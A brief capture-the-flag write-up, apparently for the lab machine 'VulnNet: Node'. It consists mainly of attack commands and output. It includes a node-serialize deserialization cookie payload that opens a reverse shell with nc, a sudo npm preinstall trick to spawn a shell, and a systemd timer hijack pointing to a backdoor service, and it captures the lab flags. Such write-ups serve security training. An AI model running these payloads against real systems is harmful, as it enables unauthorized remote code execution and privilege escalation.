# Vulnet_Node 

> VOiD | Tuesday 28 December 2021 04:25:04 PM UTC

My IP : 10.8.253.221
Target IP : 



## PORT 8080 [http]
```bash
eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D

{"username":"Guest","isGuest":true,"encoding": "utf-8"}
ÃÜ

{"username":"Admin","isAdmin":true,"encoding": "utf-8"}
ÃÜ


SyntaxError: Unexpected token � in JSON at position 56
    at JSON.parse (<anonymous>)
    at Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)
    at /home/www/VulnNet-Node/server.js:16:24
    at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/VulnNet-Node/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10)

require("child_process").exec('nc 10.8.253.221 4444 -e /bin/sh')
{"username":"_$$ND_FUNC$$_function (){\n \t require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.253.221 4444 >/tmp/f')}()","isGuest":false,"encoding": "utf-8"}

```
## USER [www]
```bash
User www may run the following commands on vulnnet-node:
    (serv-manage) NOPASSWD: /usr/bin/npm

www@vulnnet-node:/tmp$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > package.json
www@vulnnet-node:/tmp$ sudo -u serv-manage /usr/bin/npm -C . --unsafe-perm i

```


## USER [serv-manager]
```bash
serv-manage@vulnnet-node:~$ cat user.txt 
THM{064640a2f880ce9ed7a54886f1bde821}
serv-manage@vulnnet-node:~$ sudo -l
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload


ls -la /etc/systemd/system/vulnnet-job.service
-rw-rw-r-- 1 root serv-manage 197 Jan 24  2021 /etc/systemd/system/vulnnet-job.service

If you can modify a timer you can make it execute some existent systemd.unit (like a .service or a .target)
Unit=backdoor.service

nano /etc/systemd/system/vulnnet-auto.timer

# cat /root/root.txt
THM{abea728f211b105a608a720a37adabf9}

```